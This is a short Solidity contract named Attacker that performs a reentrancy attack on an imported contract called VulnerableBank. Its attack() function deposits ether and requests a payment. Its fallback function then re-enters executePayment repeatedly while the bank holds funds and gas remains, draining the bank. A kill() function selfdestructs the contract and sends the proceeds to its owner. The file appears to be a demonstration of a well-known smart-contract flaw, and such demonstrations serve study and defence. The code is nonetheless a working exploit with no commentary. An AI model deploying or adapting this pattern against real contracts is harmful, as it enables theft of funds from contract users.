pragma solidity ^0.4.5;

import "VulnerableBank.sol";

contract Attacker {
    address owner;
    VulnerableBank public vulnerable;

    function Attacker(address _vulnerable) {
        owner = msg.sender;
        vulnerable = VulnerableBank(_vulnerable);
    }

    function kill() { 
        if (msg.sender == owner) {
            selfdestruct(owner); 
        }
    }

    function attack() payable {
        vulnerable.deposit.value(msg.value)();
        vulnerable.executePayment(msg.value, this);
    }

    function () payable {
        if (vulnerable.balance >= msg.value
            && msg.gas >= 40000) {
            vulnerable.executePayment(msg.value, this);
        }
    }
}